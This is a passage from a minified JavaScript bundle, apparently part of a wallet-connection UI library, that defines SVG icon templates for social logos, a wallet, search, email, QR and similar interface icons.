0-1.1-1.1c-.4-.22-.8-.31-1.22-.35a8.7 8.7 0 0 0-.64-.04 2.57 2.57 0 0 0-4.74 0c-.23 0-.44.02-.63.04-.42.04-.83.13-1.22.35-.46.26-.84.64-1.1 1.1-.33.57-.37 1.2-.39 1.84a21.39 21.39 0 0 0 0 .72v.1a1 1 0 0 0 1 .99h.78a.57.57 0 0 1 0 1.15h-.77a1 1 0 0 0-1 .98v.1a63.87 63.87 0 0 0 0 .73c0 .64.05 1.27.38 1.83.26.47.64.85 1.1 1.11.56.32 1.2.37 1.84.38a20.93 20.93 0 0 0 .72 0h.1Z"
    clip-rule="evenodd"
  />
</svg>`,SF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.74 3.99a1 1 0 0 1 1-1H11a1 1 0 0 1 1 1v6.26a1 1 0 0 1-2 0V6.4l-6.3 6.3a1 1 0 0 1-1.4-1.42l6.29-6.3H4.74a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,CF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1877F2" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M26 12.38h-2.89c-.92 0-1.61.38-1.61 1.34v1.66H26l-.36 4.5H21.5v12H17v-12h-3v-4.5h3V12.5c0-3.03 1.6-4.62 5.2-4.62H26v4.5Z"
        />
      </g>
    </g>
    <path
      fill="#1877F2"
      d="M40 20a20 20 0 1 0-23.13 19.76V25.78H11.8V20h5.07v-4.4c0-5.02 3-7.79 7.56-7.79 2.19 0 4.48.4 4.48.4v4.91h-2.53c-2.48 0-3.25 1.55-3.25 3.13V20h5.54l-.88 5.78h-4.66v13.98A20 20 0 0 0 40 20Z"
    />
    <path
      fill="#fff"
      d="m27.79 25.78.88-5.78h-5.55v-3.75c0-1.58.78-3.13 3.26-3.13h2.53V8.2s-2.3-.39-4.48-.39c-4.57 0-7.55 2.77-7.55 7.78V20H11.8v5.78h5.07v13.98a20.15 20.15 0 0 0 6.25 0V25.78h4.67Z"
    />
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,AF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 3a1 1 0 0 1 1-1h14a1 1 0 1 1 0 2H1a1 1 0 0 1-1-1Zm2.63 5.25a1 1 0 0 1 1-1h8.75a1 1 0 1 1 0 2H3.63a1 1 0 0 1-1-1Zm2.62 5.25a1 1 0 0 1 1-1h3.5a1 1 0 0 1 0 2h-3.5a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,IF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1B1F23" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M8 19.89a12 12 0 1 1 15.8 11.38c-.6.12-.8-.26-.8-.57v-3.3c0-1.12-.4-1.85-.82-2.22 2.67-.3 5.48-1.31 5.48-5.92 0-1.31-.47-2.38-1.24-3.22.13-.3.54-1.52-.12-3.18 0 0-1-.32-3.3 1.23a11.54 11.54 0 0 0-6 0c-2.3-1.55-3.3-1.23-3.3-1.23a4.32 4.32 0 0 0-.12 3.18 4.64 4.64 0 0 0-1.24 3.22c0 4.6 2.8 5.63 5.47 5.93-.34.3-.65.83-.76 1.6-.69.31-2.42.84-3.5-1 0 0-.63-1.15-1.83-1.23 0 0-1.18-.02-.09.73 0 0 .8.37 1.34 1.76 0 0 .7 2.14 4.03 1.41v2.24c0 .31-.2.68-.8.57A12 12 0 0 1 8 19.9Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,RF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#fff" fill-opacity=".05" />
      <g clip-path="url(#c)">
        <path
          fill="#4285F4"
          d="M20 17.7v4.65h6.46a5.53 5.53 0 0 1-2.41 3.61l3.9 3.02c2.26-2.09 3.57-5.17 3.57-8.82 0-.85-.08-1.67-.22-2.46H20Z"
        />
        <path
          fill="#34A853"
          d="m13.27 22.17-.87.67-3.11 2.42A12 12 0 0 0 20 31.9c3.24 0 5.96-1.07 7.94-2.9l-3.9-3.03A7.15 7.15 0 0 1 20 27.12a7.16 7.16 0 0 1-6.72-4.94v-.01Z"
        />
        <path
          fill="#FBBC05"
          d="M9.29 14.5a11.85 11.85 0 0 0 0 10.76l3.99-3.1a7.19 7.19 0 0 1 0-4.55l-4-3.1Z"
        />
        <path
          fill="#EA4335"
          d="M20 12.66c1.77 0 3.34.61 4.6 1.8l3.43-3.44A11.51 11.51 0 0 0 20 7.89c-4.7 0-8.74 2.69-10.71 6.62l3.99 3.1A7.16 7.16 0 0 1 20 12.66Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,TF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M8.51 5.66a.83.83 0 0 0-.57-.2.83.83 0 0 0-.52.28.8.8 0 0 0-.25.52 1 1 0 0 1-2 0c0-.75.34-1.43.81-1.91a2.75 2.75 0 0 1 4.78 1.92c0 1.24-.8 1.86-1.25 2.2l-.04.03c-.47.36-.5.43-.5.65a1 1 0 1 1-2 0c0-1.25.8-1.86 1.24-2.2l.04-.04c.47-.36.5-.43.5-.65 0-.3-.1-.49-.24-.6ZM9.12 11.87a1.13 1.13 0 1 1-2.25 0 1.13 1.13 0 0 1 2.25 0Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6a6 6 0 1 0 0 12A6 6 0 0 0 8 2Z"
    clip-rule="evenodd"
  />
</svg>`,NF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    d="M6 10.49a1 1 0 1 0 2 0v-2a1 1 0 0 0-2 0v2ZM7 4.49a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 14.99a7 7 0 1 0 0-14 7 7 0 0 0 0 14Zm5-7a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"
    clip-rule="evenodd"
  />
</svg>`,OF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.83 1.34h6.34c.68 0 1.26 0 1.73.04.5.05.97.15 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73v3.71c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.47.03-1.05.03-1.73.03H4.83c-.68 0-1.26 0-1.73-.04-.5-.04-.97-.14-1.42-.4-.52-.29-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.41A20.9 20.9 0 0 1 0 9.88v-3.7c0-.7 0-1.27.04-1.74.05-.5.14-.97.4-1.42.3-.52.72-.95 1.24-1.24.45-.25.92-.35 1.42-.4.47-.04 1.05-.04 1.73-.04ZM3.28 3.38c-.36.03-.51.08-.6.14-.21.11-.39.29-.5.5a.8.8 0 0 0-.08.19l5.16 3.44c.45.3 1.03.3 1.48 0L13.9 4.2a.79.79 0 0 0-.08-.2c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.13-.37-.04-.86-.04-1.6-.04H4.88c-.73 0-1.22 0-1.6.04ZM14 6.54 9.85 9.31a3.33 3.33 0 0 1-3.7 0L2 6.54v3.3c0 .74 0 1.22.03 1.6.04.36.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h6.25c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6v-3.3Z"
    clip-rule="evenodd"
  />
</svg>`,PF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path fill="currentColor" d="M10.81 5.81a2 2 0 1 1-4 0 2 2 0 0 1 4 0Z" />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3 4.75A4.75 4.75 0 0 1 7.75 0h4.5A4.75 4.75 0 0 1 17 4.75v10.5A4.75 4.75 0 0 1 12.25 20h-4.5A4.75 4.75 0 0 1 3 15.25V4.75ZM7.75 2A2.75 2.75 0 0 0 5 4.75v10.5A2.75 2.75 0 0 0 7.75 18h4.5A2.75 2.75 0 0 0 15 15.25V4.75A2.75 2.75 0 0 0 12.25 2h-4.5Z"
    clip-rule="evenodd"
  />
</svg>`,MF=ze`<svg fill="none" viewBox="0 0 22 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M16.32 13.62a3.14 3.14 0 1 1-.99 1.72l-1.6-.93a3.83 3.83 0 0 1-3.71 1 3.66 3.66 0 0 1-1.74-1l-1.6.94a3.14 3.14 0 1 1-1-1.73l1.6-.94a3.7 3.7 0 0 1 0-2 3.81 3.81 0 0 1 1.8-2.33c.29-.17.6-.3.92-.38V6.1a3.14 3.14 0 1 1 2 0l-.01.02v1.85H12a3.82 3.82 0 0 1 2.33 1.8 3.7 3.7 0 0 1 .39 2.91l1.6.93ZM2.6 16.54a1.14 1.14 0 0 0 1.98-1.14 1.14 1.14 0 0 0-1.98 1.14ZM11 2.01a1.14 1.14 0 1 0 0 2.28 1.14 1.14 0 0 0 0-2.28Zm1.68 10.45c.08-.19.14-.38.16-.58v-.05l.02-.13v-.13a1.92 1.92 0 0 0-.24-.8l-.11-.15a1.89 1.89 0 0 0-.74-.6 1.86 1.86 0 0 0-.77-.17h-.19a1.97 1.97 0 0 0-.89.34 1.98 1.98 0 0 0-.61.74 1.99 1.99 0 0 0-.16.9v.05a1.87 1.87 0 0 0 .24.74l.1.15c.12.16.26.3.42.42l.16.1.13.07.04.02a1.84 1.84 0 0 0 .76.17h.17a2 2 0 0 0 .91-.35 1.78 1.78 0 0 0 .52-.58l.03-.05a.84.84 0 0 0 .05-.11Zm5.15 4.5a1.14 1.14 0 0 0 1.14-1.97 1.13 1.13 0 0 0-1.55.41c-.32.55-.13 1.25.41 1.56Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.63 9.43a1.5 1.5 0 1 0 1.5-2.6 1.5 1.5 0 0 0-1.5 2.6Zm.32-1.55a.5.5 0 0 1 .68-.19.5.5 0 0 1 .18.68.5.5 0 0 1-.68.19.5.5 0 0 1-.18-.68ZM17.94 8.88a1.5 1.5 0 1 1-2.6-1.5 1.5 1.5 0 1 1 2.6 1.5ZM16.9 7.69a.5.5 0 0 0-.68.19.5.5 0 0 0 .18.68.5.5 0 0 0 .68-.19.5.5 0 0 0-.18-.68ZM9.75 17.75a1.5 1.5 0 1 1 2.6 1.5 1.5 1.5 0 1 1-2.6-1.5Zm1.05 1.18a.5.5 0 0 0 .68-.18.5.5 0 0 0-.18-.68.5.5 0 0 0-.68.18.5.5 0 0 0 .18.68Z"
    clip-rule="evenodd"
  />
</svg>`,kF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.13 1h1.71c1.46 0 2.63 0 3.56.1.97.1 1.8.33 2.53.85a5 5 0 0 1 1.1 1.11c.53.73.75 1.56.86 2.53.1.93.1 2.1.1 3.55v1.72c0 1.45 0 2.62-.1 3.55-.1.97-.33 1.8-.86 2.53a5 5 0 0 1-1.1 1.1c-.73.53-1.56.75-2.53.86-.93.1-2.1.1-3.55.1H9.13c-1.45 0-2.62 0-3.56-.1-.96-.1-1.8-.33-2.52-.85a5 5 0 0 1-1.1-1.11 5.05 5.05 0 0 1-.86-2.53c-.1-.93-.1-2.1-.1-3.55V9.14c0-1.45 0-2.62.1-3.55.1-.97.33-1.8.85-2.53a5 5 0 0 1 1.1-1.1 5.05 5.05 0 0 1 2.53-.86C6.51 1 7.67 1 9.13 1ZM5.79 3.09a3.1 3.1 0 0 0-1.57.48 3 3 0 0 0-.66.67c-.24.32-.4.77-.48 1.56-.1.82-.1 1.88-.1 3.4v1.6c0 1.15 0 2.04.05 2.76l.41-.42c.5-.5.93-.92 1.32-1.24.41-.33.86-.6 1.43-.7a3 3 0 0 1 .94 0c.35.06.66.2.95.37a17.11 17.11 0 0 0 .8.45c.1-.08.2-.2.41-.4l.04-.03a27 27 0 0 1 1.95-1.84 4.03 4.03 0 0 1 1.91-.94 4 4 0 0 1 1.25 0c.73.11 1.33.46 1.91.94l.64.55V9.2c0-1.52 0-2.58-.1-3.4a3.1 3.1 0 0 0-.48-1.56 3 3 0 0 0-.66-.67 3.1 3.1 0 0 0-1.56-.48C13.37 3 12.3 3 10.79 3h-1.6c-1.52 0-2.59 0-3.4.09Zm11.18 10-.04-.05a26.24 26.24 0 0 0-1.83-1.74c-.45-.36-.73-.48-.97-.52a2 2 0 0 0-.63 0c-.24.04-.51.16-.97.52-.46.38-1.01.93-1.83 1.74l-.02.02c-.17.18-.34.34-.49.47a2.04 2.04 0 0 1-1.08.5 1.97 1.97 0 0 1-1.25-.27l-.79-.46-.02-.02a.65.65 0 0 0-.24-.1 1 1 0 0 0-.31 0c-.08.02-.21.06-.49.28-.3.24-.65.59-1.2 1.14l-.56.56-.65.66a3 3 0 0 0 .62.6c.33.24.77.4 1.57.49.81.09 1.88.09 3.4.09h1.6c1.52 0 2.58 0 3.4-.09a3.1 3.1 0 0 0 1.56-.48 3 3 0 0 0 .66-.67c.24-.32.4-.77.49-1.56l.07-1.12Zm-8.02-1.03ZM4.99 7a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
    clip-rule="evenodd"
  />
</svg>`,DF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 0a1 1 0 0 1 1 1v5.38a1 1 0 0 1-2 0V1a1 1 0 0 1 1-1ZM5.26 2.6a1 1 0 0 1-.28 1.39 5.46 5.46 0 1 0 6.04 0 1 1 0 1 1 1.1-1.67 7.46 7.46 0 1 1-8.25 0 1 1 0 0 1 1.4.28Z"
    clip-rule="evenodd"
  />
</svg>`,$F=ze` <svg
  width="36"
  height="36"
  fill="none"
>
  <path
    d="M0 8a8 8 0 0 1 8-8h20a8 8 0 0 1 8 8v20a8 8 0 0 1-8 8H8a8 8 0 0 1-8-8V8Z"
    fill="#fff"
    fill-opacity=".05"
  />
  <path
    d="m18.262 17.513-8.944 9.49v.01a2.417 2.417 0 0 0 3.56 1.452l.026-.017 10.061-5.803-4.703-5.132Z"
    fill="#EA4335"
  />
  <path
    d="m27.307 15.9-.008-.008-4.342-2.52-4.896 4.36 4.913 4.912 4.325-2.494a2.42 2.42 0 0 0 .008-4.25Z"
    fill="#FBBC04"
  />
  <path
    d="M9.318 8.997c-.05.202-.084.403-.084.622V26.39c0 .218.025.42.084.621l9.246-9.247-9.246-8.768Z"
    fill="#4285F4"
  />
  <path
    d="m18.33 18 4.627-4.628-10.053-5.828a2.427 2.427 0 0 0-3.586 1.444L18.329 18Z"
    fill="#34A853"
  />
  <path
    d="M8 .5h20A7.5 7.5 0 0 1 35.5 8v20a7.5 7.5 0 0 1-7.5 7.5H8A7.5 7.5 0 0 1 .5 28V8A7.5 7.5 0 0 1 8 .5Z"
    stroke="#fff"
    stroke-opacity=".05"
  />
</svg>`,LF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M3 6a3 3 0 0 1 3-3h1a1 1 0 1 0 0-2H6a5 5 0 0 0-5 5v1a1 1 0 0 0 2 0V6ZM13 1a1 1 0 1 0 0 2h1a3 3 0 0 1 3 3v1a1 1 0 1 0 2 0V6a5 5 0 0 0-5-5h-1ZM3 13a1 1 0 1 0-2 0v1a5 5 0 0 0 5 5h1a1 1 0 1 0 0-2H6a3 3 0 0 1-3-3v-1ZM19 13a1 1 0 1 0-2 0v1a3 3 0 0 1-3 3h-1a1 1 0 1 0 0 2h1.01a5 5 0 0 0 5-5v-1ZM5.3 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05A1.5 1.5 0 0 0 9.2 8.14c.06-.2.06-.43.06-.89s0-.7-.06-.89A1.5 1.5 0 0 0 8.14 5.3c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM10.8 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM5.26 12.75c0-.46 0-.7.05-.89a1.5 1.5 0 0 1 1.06-1.06c.19-.05.42-.05.89-.05.46 0 .7 0 .88.05.52.14.93.54 1.06 1.06.06.2.06.43.06.89s0 .7-.06.89a1.5 1.5 0 0 1-1.06 1.06c-.19.05-.42.05-.88.05-.47 0-.7 0-.9-.05a1.5 1.5 0 0 1-1.05-1.06c-.05-.2-.05-.43-.05-.89ZM10.8 11.86c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06Z"
  />
</svg>`,BF=ze`<svg fill="none" viewBox="0 0 14 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.94 1.04a1 1 0 0 1 .7 1.23l-.48 1.68a5.85 5.85 0 0 1 8.53 4.32 5.86 5.86 0 0 1-11.4 2.56 1 1 0 0 1 1.9-.57 3.86 3.86 0 1 0 1.83-4.5l1.87.53a1 1 0 0 1-.55 1.92l-4.1-1.15a1 1 0 0 1-.69-1.23l1.16-4.1a1 1 0 0 1 1.23-.7Z"
    clip-rule="evenodd"
  />
</svg>`,FF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.36 4.21a5.14 5.14 0 1 0 0 10.29 5.14 5.14 0 0 0 0-10.29ZM1.64 9.36a7.71 7.71 0 1 1 14 4.47l2.52 2.5a1.29 1.29 0 1 1-1.82 1.83l-2.51-2.51A7.71 7.71 0 0 1 1.65 9.36Z"
    clip-rule="evenodd"
  />
</svg>`,jF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.76.3a1 1 0 0 1 0 1.4L4.07 4.4h9a1 1 0 1 1 0 2h-9l2.69 2.68a1 1 0 1 1-1.42 1.42L.95 6.09a1 1 0 0 1 0-1.4l4.4-4.4a1 1 0 0 1 1.4 0Zm6.49 9.21a1 1 0 0 1 1.41 0l4.39 4.4a1 1 0 0 1 0 1.4l-4.39 4.4a1 1 0 0 1-1.41-1.42l2.68-2.68h-9a1 1 0 0 1 0-2h9l-2.68-2.68a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,UF=ze`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.48 2.18a1 1 0 0 1 1.41 0l2.68 2.68a1 1 0 1 1-1.41 1.42l-.98-.98v4.56a1 1 0 0 1-2 0V5.3l-.97.98A1 1 0 0 1 .79 4.86l2.69-2.68Zm6.34 2.93a1 1 0 0 1 1 1v4.56l.97-.98a1 1 0 1 1 1.42 1.42l-2.69 2.68a1 1 0 0 1-1.41 0l-2.68-2.68a1 1 0 0 1 1.41-1.42l.98.98V6.1a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,WF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg> `,zF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5A3E85" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M18.22 25.7 20 23.91h3.34l2.1-2.1v-6.68H15.4v8.78h2.82v1.77Zm3.87-8.16h1.25v3.66H22.1v-3.66Zm-3.34 0H20v3.66h-1.25v-3.66ZM20 7.9a12 12 0 1 0 0 24 12 12 0 0 0 0-24Zm6.69 14.56-3.66 3.66h-2.72l-1.77 1.78h-1.88V26.1H13.3v-9.82l.94-2.4H26.7v8.56Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,HF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1D9BF0" />
      <path
        fill="#fff"
        d="M30 13.81c-.74.33-1.53.55-2.36.65.85-.51 1.5-1.32 1.8-2.27-.79.47-1.66.8-2.6 1a4.1 4.1 0 0 0-7 3.73c-3.4-.17-6.42-1.8-8.45-4.28a4.1 4.1 0 0 0 1.27 5.47c-.67-.02-1.3-.2-1.86-.5a4.1 4.1 0 0 0 3.3 4.07c-.58.15-1.21.19-1.86.07a4.1 4.1 0 0 0 3.83 2.85A8.25 8.25 0 0 1 10 26.3a11.62 11.62 0 0 0 6.29 1.84c7.62 0 11.92-6.44 11.66-12.2.8-.59 1.5-1.3 2.05-2.13Z"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,qF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="m14.36 4.74.01.42c0 4.34-3.3 9.34-9.34 9.34A9.3 9.3 0 0 1 0 13.03a6.6 6.6 0 0 0 4.86-1.36 3.29 3.29 0 0 1-3.07-2.28c.5.1 1 .07 1.48-.06A3.28 3.28 0 0 1 .64 6.11v-.04c.46.26.97.4 1.49.41A3.29 3.29 0 0 1 1.11 2.1a9.32 9.32 0 0 0 6.77 3.43 3.28 3.28 0 0 1 5.6-3 6.59 6.59 0 0 0 2.08-.8 3.3 3.3 0 0 1-1.45 1.82A6.53 6.53 0 0 0 16 3.04c-.44.66-1 1.23-1.64 1.7Z"
  />
</svg>`,VF=ze`
  <svg fill="none" viewBox="0 0 48 44">
    <path
      style="fill: var(--wui-color-bg-300);"
      d="M4.56 8.64c-1.23 1.68-1.23 4.08-1.23 8.88v8.96c0 4.8 0 7.2 1.23 8.88.39.55.87 1.02 1.41 1.42C7.65 38 10.05 38 14.85 38h14.3c4.8 0 7.2 0 8.88-1.22a6.4 6.4 0 0 0 1.41-1.42c.83-1.14 1.1-2.6 1.19-4.92a6.4 6.4 0 0 0 5.16-4.65c.21-.81.21-1.8.21-3.79 0-1.98 0-2.98-.22-3.79a6.4 6.4 0 0 0-5.15-4.65c-.1-2.32-.36-3.78-1.19-4.92a6.4 6.4 0 0 0-1.41-1.42C36.35 6 33.95 6 29.15 6h-14.3c-4.8 0-7.2 0-8.88 1.22a6.4 6.4 0 0 0-1.41 1.42Z"
    />
    <path
      style="fill: var(--wui-color-fg-200);"
      fill-rule="evenodd"
      d="M2.27 11.33a6.4 6.4 0 0 1 6.4-6.4h26.66a6.4 6.4 0 0 1 6.4 6.4v1.7a6.4 6.4 0 0 1 5.34 6.3v5.34a6.4 6.4 0 0 1-5.34 6.3v1.7a6.4 6.4 0 0 1-6.4 6.4H8.67a6.4 6.4 0 0 1-6.4-6.4V11.33ZM39.6 31.07h-6.93a9.07 9.07 0 1 1 0-18.14h6.93v-1.6a4.27 4.27 0 0 0-4.27-4.26H8.67a4.27 4.27 0 0 0-4.27 4.26v21.34a4.27 4.27 0 0 0 4.27 4.26h26.66a4.27 4.27 0 0 0 4.27-4.26v-1.6Zm-6.93-16a6.93 6.93 0 0 0 0 13.86h8a4.27 4.27 0 0 0 4.26-4.26v-5.34a4.27 4.27 0 0 0-4.26-4.26h-8Z"
      clip-rule="evenodd"
    />
  </svg>
`,GF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
    clip-rule="evenodd"
  />
</svg>`,KF=ze`<svg fill="none" viewBox="0 0 96 67">
  <path
    fill="currentColor"
    d="M25.32 18.8a32.56 32.56 0 0 1 45.36 0l1.5 1.47c.63.62.63 1.61 0 2.22l-5.15 5.05c-.31.3-.82.3-1.14 0l-2.07-2.03a22.71 22.71 0 0 0-31.64 0l-2.22 2.18c-.31.3-.82.3-1.14 0l-5.15-5.05a1.55 1.55 0 0 1 0-2.22l1.65-1.62Zm56.02 10.44 4.59 4.5c.63.6.63 1.6 0 2.21l-20.7 20.26c-.62.61-1.63.61-2.26 0L48.28 41.83a.4.4 0 0 0-.56 0L33.03 56.21c-.63.61-1.64.61-2.27 0L10.07 35.95a1.55 1.55 0 0 1 0-2.22l4.59-4.5a1.63 1.63 0 0 1 2.27 0L31.6 43.63a.4.4 0 0 0 .57 0l14.69-14.38a1.63 1.63 0 0 1 2.26 0l14.69 14.38a.4.4 0 0 0 .57 0l14.68-14.38a1.63 1.63 0 0 1 2.27 0Z"
  />
  <path
    stroke="#000"
    stroke-opacity=".1"
